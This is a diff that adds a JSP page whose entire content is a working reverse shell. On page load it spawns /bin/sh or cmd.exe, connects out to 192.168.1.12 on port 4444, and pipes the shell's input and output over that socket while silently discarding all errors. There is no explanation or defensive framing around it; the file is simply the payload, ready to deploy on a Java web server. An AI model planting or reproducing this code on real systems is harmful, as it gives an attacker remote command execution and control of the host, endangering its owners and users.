@@ -1,0 +1,58 @@
+  <%@page import="java.lang.*"%>
+    <%@page import="java.util.*"%>
+    <%@page import="java.io.*"%>
+    <%@page import="java.net.*"%>
+
+    <%
+    class StreamConnector extends Thread
+    {
+    InputStream em;
+    OutputStream hu;
+
+    StreamConnector( InputStream em, OutputStream hu )
+    {
+    this.em = em;
+    this.hu = hu;
+    }
+
+    public void run()
+    {
+    BufferedReader cp = null;
+    BufferedWriter kwk = null;
+    try
+    {
+    cp = new BufferedReader( new InputStreamReader( this.em ) );
+    kwk = new BufferedWriter( new OutputStreamWriter( this.hu ) );
+    char buffer[] = new char[8192];
+    int length;
+    while( ( length = cp.read( buffer, 0, buffer.length ) ) > 0 )
+    {
+    kwk.write( buffer, 0, length );
+    kwk.flush();
+    }
+    } catch( Exception e ){}
+    try
+    {
+    if( cp != null )
+    cp.close();
+    if( kwk != null )
+    kwk.close();
+    } catch( Exception e ){}
+    }
+    }
+
+    try
+    {
+    String ShellPath;
+    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+    ShellPath = new String("/bin/sh");
+    } else {
+    ShellPath = new String("cmd.exe");
+    }
+
+    Socket socket = new Socket( "192.168.1.12", 4444 );
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+    } catch( Exception e ) {}
+    %>
